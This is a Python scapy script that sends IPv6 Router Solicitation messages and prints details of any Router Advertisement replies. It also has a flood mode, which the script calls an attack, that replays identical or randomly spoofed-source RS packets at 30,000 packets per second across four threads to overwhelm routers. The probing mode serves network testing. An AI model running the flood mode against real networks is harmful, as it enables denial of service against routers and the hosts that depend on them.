#!/usr/bin/python3
import argparse
import logging
import random
import sys
import threading
import time

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6ND_RS, ICMPv6NDOptSrcLLAddr, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, \
    ICMPv6NDOptRDNSS, ICMPv6NDOptMTU
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast, srp1

from validate_parameters import is_valid_ipv6, is_valid_mac, convert_flag, convert_preference, is_valid_num, mac2ipv6


def main():
    parser = argparse.ArgumentParser(description="Sending arbitrary Router Solicitation message to specified target, "
                                                 "with option to flood.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::2"
                                                                            " if skipping)")
    parser.add_argument("-p", dest="period", type=int, action="store", help="send the RA messages periodically every "
                                                                            "defined seconds")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the target with option: sending RS messages using only the defined addresses ("
                             "constant), or sending RS messages with many random addresses")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET6][
            len(netifaces.ifaddresses(args.interface)[netifaces.AF_INET6]) - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::2"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the period and flood
    if args.period is not None and args.flood is not None:
        print("---> Only one of two options (periodical sending, flooding) can exist. Try again!!!")
        sys.exit(1)
    if args.period is not None:
        if not is_valid_num(args.period):
            print("---> The given number of period is invalid. Try again!!!")
            sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    # Generate the packet
    layer2 = Ether(src=args.source_mac)
    layer3 = IPv6(src=args.source_ip, dst=args.destination_ip)
    packet1 = layer2 / layer3 / ICMPv6ND_RS() / ICMPv6NDOptSrcLLAddr(lladdr=args.source_mac)
    if args.period is None and args.flood is None:  # Normal situation
        print("Sending Router Solicitation message to the destination: " + args.destination_ip)
        # send the packet and receive the response
        responses = srp1(packet1, iface=args.interface, timeout=2, verbose=0)

        # check if a response was received
        if responses is not None:
            for response in responses:
                if response is not None and ICMPv6ND_RA in response:
                    # print the source MAC address of the response
                    print("===> RA Response received from", response[1].src, "with MAC address: ", response.src)
                    print("        Flags: M-" + convert_flag(response[ICMPv6ND_RA].M) + ", O-" + convert_flag(response[ICMPv6ND_RA].O) + ", H-" + convert_flag(response[ICMPv6ND_RA].H) + ", A-" + convert_flag(response[ICMPv6ND_RA].A) + ", preference-" + convert_preference(response[ICMPv6ND_RA].prf))
                    print("         Time: Router lifetime (" + str(response[ICMPv6ND_RA].routerlifetime) + "s), Reachable time (" + str(response[ICMPv6ND_RA].reachabletime) + "ms), Retrans timer (" + str(response[ICMPv6ND_RA].retranstimer) + "ms)")
                    if ICMPv6NDOptPrefixInfo in response:
                        print("       Prefix: " + response[ICMPv6NDOptPrefixInfo].prefix + "/" + str(
                            response[ICMPv6NDOptPrefixInfo].prefixlen) + ", Valid lifetime (" + str(
                            response[ICMPv6NDOptPrefixInfo].validlifetime) + "s), Preferred lifetime (" + str(
                            response[ICMPv6NDOptPrefixInfo].preferredlifetime) + "s)")
                    if ICMPv6NDOptRDNSS in response:
                        print("          DNS: " + str(response[ICMPv6NDOptRDNSS].dns))
                    if ICMPv6NDOptMTU in response:
                        print("          MTU: " + str(response[ICMPv6NDOptMTU].mtu))
                else:
                    print("===> No response received.")
                    break
        if responses is None:
            print("===> No response received.")

    if args.period is not None:
        print("Sending Router Solicitation every " + str(args.period) + " second(s) to the destination: " +
              args.destination_ip + " (press Ctrl+C to stop the program).....")
        # send the packet and receive the response
        while True:
            try:
                responses = srp1(packet1, iface=args.interface, timeout=2, verbose=0)

                # check if a response was received
                if responses is not None:
                    for response in responses:
                        if response is not None and ICMPv6ND_RA in response:
                            # print the source MAC address of the response
                            print("===> RA Response received from", response[1].src, "with MAC address: ", response.src)
                            print("        Flags: M-" + convert_flag(response[ICMPv6ND_RA].M) + ", O-" + convert_flag(
                                response[ICMPv6ND_RA].O) + ", H-" + convert_flag(
                                response[ICMPv6ND_RA].H) + ", A-" + convert_flag(
                                response[ICMPv6ND_RA].A) + ", preference-" + convert_preference(response[ICMPv6ND_RA].prf))
                            print("         Time: Router lifetime (" + str(
                                response[ICMPv6ND_RA].routerlifetime) + "s), Reachable time (" + str(
                                response[ICMPv6ND_RA].reachabletime) + "ms), Retrans timer (" + str(
                                response[ICMPv6ND_RA].retranstimer) + "ms)")
                            if ICMPv6NDOptPrefixInfo in response:
                                print("       Prefix: " + response[ICMPv6NDOptPrefixInfo].prefix + "/" + str(
                                    response[ICMPv6NDOptPrefixInfo].prefixlen) + ", Valid lifetime (" + str(response[ICMPv6NDOptPrefixInfo].validlifetime) + "s), Preferred lifetime (" + str(response[ICMPv6NDOptPrefixInfo].preferredlifetime) + "s)")
                            if ICMPv6NDOptRDNSS in response:
                                print("          DNS: " + str(response[ICMPv6NDOptRDNSS].dns))
                            if ICMPv6NDOptMTU in response:
                                print("          MTU: " + str(response[ICMPv6NDOptMTU].mtu))
                        else:
                            print("===> No response received.")
                            break
                if responses is None:
                    print("===> No response received.")
                time.sleep(args.period)
            except KeyboardInterrupt:
                break

    if args.flood is not None:  # Flooding the target
        pkt_list = []
        print("Flooding the destination: " + args.destination_ip + "with Router Solicitation messages (press Ctrl+C "
                                                                   "to stop the attack).....")
        if args.flood == "constant":
            for i in range(200):
                pkt_list.append(packet1)
        if args.flood == "random":
            for i in range(100):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                source_ip = mac2ipv6(random_mac)
                layer2 = Ether(src=random_mac, dst="33:33:00:00:00:01")
                layer3 = IPv6(src=source_ip, dst=args.destination_ip)
                packet1 = layer2 / layer3 / ICMPv6ND_RS() / ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, args.interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # If KeyboardInterrupt is raised in the main thread, stop all child threads
        threading.Event().set()
        sys.exit(0)
